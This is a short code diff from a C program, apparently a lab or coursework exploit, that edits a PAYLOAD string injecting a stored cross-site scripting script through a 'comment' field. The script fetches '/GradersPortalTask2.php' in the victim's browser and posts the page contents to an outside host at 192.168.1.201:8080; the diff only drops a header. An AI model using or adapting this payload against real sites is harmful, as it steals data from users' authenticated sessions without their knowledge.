@@ -174,7 +174,7 @@ void _send(const int32_t client, const void * const data, size_t size) {
     }
 }
 
-#define PAYLOAD "comment=<script>(async () => {const url = '/GradersPortalTask2.php';try {const response = await fetch(url);if (!response.ok) {throw new Error(`HTTP error! Status: ${response.status}`);}const data = await response.text();console.log('Success:', data);const my_url = 'http://192.168.1.201:8080';response = await fetch(my_url, {method: 'POST',body: data, headers: { 'Connection': 'close' }});if (!response.ok) {throw new Error(`HTTP error! Status: ${response.status}`);}} catch (error) {console.error('Fetch failed:', error);return null;}})();</script>"
+#define PAYLOAD "comment=<script>(async () => {const url = '/GradersPortalTask2.php';try {const response = await fetch(url);if (!response.ok) {throw new Error(`HTTP error! Status: ${response.status}`);}const data = await response.text();console.log('Success:', data);const my_url = 'http://192.168.1.201:8080';response = await fetch(my_url, {method: 'POST',body: data});if (!response.ok) {throw new Error(`HTTP error! Status: ${response.status}`);}} catch (error) {console.error('Fetch failed:', error);return null;}})();</script>"
 
 int32_t main() {
     int32_t sockfd = create_socket();
